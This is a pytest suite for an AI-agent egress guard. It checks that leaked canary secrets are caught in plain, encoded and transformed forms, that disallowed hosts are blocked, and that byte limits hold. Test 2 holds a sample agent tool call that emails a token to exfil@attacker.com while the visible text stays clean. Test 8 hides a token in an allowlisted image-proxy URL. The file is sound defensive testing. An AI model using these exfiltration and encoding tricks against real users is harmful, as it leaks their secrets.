"""
tests.test_egress -- tests for the egress layer:
    - spanguard.layers.egress (EgressLayer)
    - Canary matching across readings closure (plain, spaced, base64, hex, reversed, rot13)
    - Length floor enforcement (PolicyError on short/collapsed canaries)
    - URL scheme / protocol-relative matching & dotted authority requirement
    - Host allowlist label-boundary suffix matching
    - CamoLeak defense: query string / path canary scanning on allowlisted hosts
    - Per-string and aggregate byte limit enforcement
    - Hypothesis property-based composition testing
"""

from __future__ import annotations

import base64
import codecs
from typing import TYPE_CHECKING

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from spanguard import config
from spanguard.layers.egress import EgressLayer
from spanguard.policy import Policy, PolicyError
from spanguard.tools import AgentReply, ToolCallRequest
from spanguard.verdict import Severity

if TYPE_CHECKING:
    from collections.abc import Callable


# ---------------------------------------------------------------------------
# Test Constants
# ---------------------------------------------------------------------------

SAMPLE_CANARY = "sk-prod-supersecret99"


# ---------------------------------------------------------------------------
# Helpers / Encoders
# ---------------------------------------------------------------------------


def encode_spaced_out(s: str) -> str:
    return " ".join(s)


def encode_base64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def encode_hex(s: str) -> str:
    return s.encode("utf-8").hex()


def encode_reversed(s: str) -> str:
    return s[::-1]


def encode_rot13(s: str) -> str:
    return codecs.encode(s, "rot_13")


def encode_zero_width(s: str) -> str:
    return "\u200b".join(s)


def encode_dash_joined(s: str) -> str:
    return "-".join(s)


NAMED_TRANSFORMS: dict[str, Callable[[str], str]] = {
    "append-separators": encode_dash_joined,
    "base64-encode": encode_base64,
    "hex-encode": encode_hex,
    "reverse": encode_reversed,
    "rot13": encode_rot13,
    "add-zero-width-noise": encode_zero_width,
}


# ---------------------------------------------------------------------------
# Test Suite
# ---------------------------------------------------------------------------


class TestEgressLayer:
    def test_1_plain_text_canary_leak_in_reply_text(self) -> None:
        """Test 1: Plain-text canary leak in reply text is caught as CRITICAL invariant."""
        policy = Policy(canary_secrets=(SAMPLE_CANARY,))
        layer = EgressLayer()
        reply = AgentReply(text=f"The requested token is {SAMPLE_CANARY} for access.")

        findings = layer.inspect_reply(reply, policy)

        assert len(findings) >= 1
        canary_findings = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]
        assert len(canary_findings) == 1
        f = canary_findings[0]
        assert f.layer == config.LAYER_EGRESS
        assert f.severity == Severity.CRITICAL
        assert f.invariant is True

    def test_2_canary_leak_inside_tool_call_argument(self) -> None:
        """Test 2: Canary leak inside a tool call argument value is caught.

        Visible text is completely clean -- mirrors the real-world EchoLeak shape.
        """
        policy = Policy(canary_secrets=(SAMPLE_CANARY,))
        layer = EgressLayer()
        reply = AgentReply(
            text="I have sent the confirmation email to your manager.",
            tool_calls=(
                ToolCallRequest(
                    tool_name="send_email",
                    args={"recipient": "exfil@attacker.com", "body": f"Token: {SAMPLE_CANARY}"},
                ),
            ),
        )

        findings = layer.inspect_reply(reply, policy)

        assert len(findings) >= 1
        canary_findings = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]
        assert len(canary_findings) == 1
        f = canary_findings[0]
        assert f.layer == config.LAYER_EGRESS
        assert f.severity == Severity.CRITICAL
        assert f.invariant is True

    @pytest.mark.parametrize(
        ("encoding_name", "encoder"),
        [
            ("spaced-out", encode_spaced_out),
            ("base64", encode_base64),
            ("hex", encode_hex),
            ("reversed", encode_reversed),
            ("rot13", encode_rot13),
        ],
    )
    def test_3_encoded_canary_forms_caught_by_same_mechanism(
        self,
        encoding_name: str,
        encoder: Callable[[str], str],
    ) -> None:
        """Test 3: Spaced-out, base64, hex, reversed, and rot13 forms of the SAME canary

        are all caught by the same closure code path.
        """
        policy = Policy(canary_secrets=(SAMPLE_CANARY,))
        layer = EgressLayer()
        encoded_value = encoder(SAMPLE_CANARY)
        reply = AgentReply(text=f"Output code: {encoded_value}")

        findings = layer.inspect_reply(reply, policy)

        canary_findings = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]
        assert len(canary_findings) == 1, (
            f"Failed to catch {encoding_name} encoding of secret: {encoded_value}"
        )
        assert canary_findings[0].severity == Severity.CRITICAL
        assert canary_findings[0].invariant is True

    def test_4_canary_below_usable_length_floor_raises_at_construction(self) -> None:
        """Test 4: Canary registered below length floor raises PolicyError at construction."""
        # Raw short canary

        with pytest.raises(PolicyError, match="too short"):
            Policy(canary_secrets=("short",))

        # Long-looking raw canary that collapses to short string post-normalization
        with pytest.raises(PolicyError, match="too short"):
            Policy(canary_secrets=("   a   b   ",))

        # EgressLayer construction directly validating policy canaries
        with pytest.raises(PolicyError, match="too short"):
            EgressLayer(canaries=("abc",))

    def test_5_url_scheme_variants_caught(self) -> None:
        """Test 5: Lowercase absolute, uppercase scheme, and protocol-relative URLs

        to a disallowed host are ALL caught without requiring case-insensitive flags.
        """
        policy = Policy(host_allowlist=(".trusted.example.com",))
        layer = EgressLayer()

        urls = [
            "http://disallowed.example.com/api/v1",
            "HTTPS://DISALLOWED.EXAMPLE.COM/api/v1",
            "//disallowed.example.com/api/v1",
        ]

        for url in urls:
            reply = AgentReply(text=f"Refer to {url} for instructions.")
            findings = layer.inspect_reply(reply, policy)
            disallowed = [f for f in findings if f.rule == config.RULE_DISALLOWED_HOST]
            assert len(disallowed) >= 1, f"Failed to catch disallowed URL variant: {url}"
            assert disallowed[0].severity == Severity.CRITICAL
            assert disallowed[0].invariant is True

    def test_6_code_comment_and_unc_path_not_flagged(self) -> None:
        """Test 6: //comment and //server/share strings in ordinary text do NOT get flagged."""
        policy = Policy(host_allowlist=(".trusted.example.com",))
        layer = EgressLayer()
        reply = AgentReply(
            text=(
                "In C++ you write comments like //comment in code.\n"
                "In Windows UNC you can write //server/share for paths."
            )
        )

        findings = layer.inspect_reply(reply, policy)
        assert findings == []

    def test_7_host_allowlist_label_boundary_suffix_matching(self) -> None:
        """Test 7: Host allowlist matches on label boundaries:

        mail.example.com matches .example.com; evilexample.com does NOT.
        """
        policy = Policy(host_allowlist=(".example.com",))
        layer = EgressLayer()

        # Legitimate subdomain on label boundary -> allowed
        reply_valid = AgentReply(text="Visit https://mail.example.com/inbox")
        findings_valid = layer.inspect_reply(reply_valid, policy)
        assert not any(f.rule == config.RULE_DISALLOWED_HOST for f in findings_valid)

        # Attacker domain ending with same string but wrong label boundary -> disallowed
        reply_evil = AgentReply(text="Visit https://evilexample.com/inbox")
        findings_evil = layer.inspect_reply(reply_evil, policy)
        assert any(f.rule == config.RULE_DISALLOWED_HOST for f in findings_evil)

    def test_8_canary_in_query_string_of_allowlisted_host_still_fires(self) -> None:
        """Test 8: Canary in query string of an allowlisted host still fires (CamoLeak defense)."""
        policy = Policy(
            canary_secrets=(SAMPLE_CANARY,),
            host_allowlist=(".example.com",),
        )
        layer = EgressLayer()
        reply = AgentReply(
            text=f"Check image at https://images.example.com/proxy?token={SAMPLE_CANARY}&format=png"
        )

        findings = layer.inspect_reply(reply, policy)

        # Disallowed host should NOT fire because images.example.com is allowlisted
        assert not any(f.rule == config.RULE_DISALLOWED_HOST for f in findings)

        # Canary leak MUST fire
        canary_findings = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]
        assert len(canary_findings) == 1
        assert canary_findings[0].severity == Severity.CRITICAL
        assert canary_findings[0].invariant is True

    @given(
        transform_names=st.lists(
            st.sampled_from(list(NAMED_TRANSFORMS.keys())),
            min_size=1,
            max_size=3,
        )
    )
    @settings(max_examples=300, deadline=None)
    def test_9_property_random_transform_sequences(self, transform_names: list[str]) -> None:
        """Test 9: Hypothesis property test asserting canary rule fires across random

        1-3 transform composition sequences applied to fixed secret.
        """
        canary_target = "TopSecretCanary99"
        policy = Policy(canary_secrets=(canary_target,))
        layer = EgressLayer()

        # Apply transform sequence in order
        transformed = canary_target
        for name in transform_names:
            transformed = NAMED_TRANSFORMS[name](transformed)

        reply = AgentReply(text=f"Data dump: {transformed}")
        findings = layer.inspect_reply(reply, policy)
        canary_findings = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]

        sequence_str = " -> ".join(transform_names)
        assert len(canary_findings) >= 1, (
            f"Canary leak not detected for transform sequence [{sequence_str}]. "
            f"Transformed output was: {transformed!r}"
        )

    def test_per_string_byte_limit_exceeded(self) -> None:
        """Per-string byte limit exceeded produces invariant BLOCK finding."""
        policy = Policy()
        layer = EgressLayer()
        oversized = "A" * (config.MAX_EGRESS_BYTES + 10)
        reply = AgentReply(text=oversized)

        findings = layer.inspect_reply(reply, policy)
        assert len(findings) == 1
        f = findings[0]
        assert f.rule == config.RULE_EGRESS_BYTE_LIMIT_EXCEEDED
        assert f.severity == Severity.CRITICAL
        assert f.invariant is True

    def test_aggregate_byte_limit_exceeded(self) -> None:
        """Aggregate byte limit exceeded across reply produces invariant BLOCK finding."""
        policy = Policy()
        layer = EgressLayer()
        chunk = "B" * (config.MAX_EGRESS_BYTES // 2 + 100)
        reply = AgentReply(
            text=chunk,
            tool_calls=(
                ToolCallRequest(
                    tool_name="submit_data",
                    args={"field1": chunk},
                ),
            ),
        )

        findings = layer.inspect_reply(reply, policy)
        assert any(f.rule == config.RULE_EGRESS_BYTE_LIMIT_EXCEEDED for f in findings)
        f = next(f for f in findings if f.rule == config.RULE_EGRESS_BYTE_LIMIT_EXCEEDED)
        assert f.severity == Severity.CRITICAL
        assert f.invariant is True

    def test_clean_reply_with_allowlisted_url_produces_zero_findings(self) -> None:
        """Clean reply with allowlisted URL produces no findings."""
        policy = Policy(
            canary_secrets=(SAMPLE_CANARY,),
            host_allowlist=(".example.com",),
        )
        layer = EgressLayer()
        reply = AgentReply(text="Here is docs: https://docs.example.com/guide")

        findings = layer.inspect_reply(reply, policy)
        assert findings == []
